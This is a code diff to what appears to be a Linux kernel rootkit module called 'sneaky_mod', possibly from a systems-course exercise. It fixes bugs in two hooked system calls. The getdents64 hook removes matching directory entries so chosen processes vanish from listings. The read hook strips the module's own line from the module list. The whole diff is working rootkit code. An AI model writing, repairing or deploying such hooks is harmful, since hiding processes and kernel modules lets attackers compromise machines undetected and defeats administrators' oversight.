@@ -88,10 +88,10 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
   while (scan < total) {
     if (is_sneaky_process(current_entry)) {
       total = remove_entry(dirp, current_entry, total);
-    } else {
-      scan += current_entry->d_reclen;
-      current_entry = next_entry(current_entry);
+      continue;
     }
+    scan += current_entry->d_reclen;
+    current_entry = next_entry(current_entry);
   }
 
   return total;
@@ -109,14 +109,14 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
 }
 
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
+  ssize_t total = (ssize_t)(*original_read)(regs);
   char *buf = (char *)regs->si;
   char *sneaky_mod_line = strstr(buf, "sneaky_mod ");
 
-  ssize_t total = (ssize_t)(*original_read)(regs);
   if (total <= 0) {
     return total;
   }
-
+  
   if (sneaky_mod_line != NULL) {
     char *next_module_line = strchr(sneaky_mod_line, '\n') + 1;
     memmove(sneaky_mod_line, next_module_line, buf + total - next_module_line);
